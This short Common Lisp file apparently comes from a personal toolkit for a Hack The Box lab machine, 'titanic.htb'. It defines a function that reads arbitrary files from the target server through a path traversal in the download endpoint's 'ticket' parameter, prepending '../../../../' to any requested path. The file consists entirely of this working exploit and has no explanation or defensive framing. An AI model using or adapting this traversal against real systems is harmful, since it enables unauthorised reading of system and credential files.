(in-package :grimoire)

(defun titanic/read-file (path)
  (let* ((url (format nil "http://titanic.htb/download?ticket=../../../../~a" path))
         (res (dex:get url)))
    (handler-case (trivial-utf-8:utf-8-bytes-to-string res)
      (error (c)
        (format t "[+] Error reading file: ~a~%" c)
        res))))
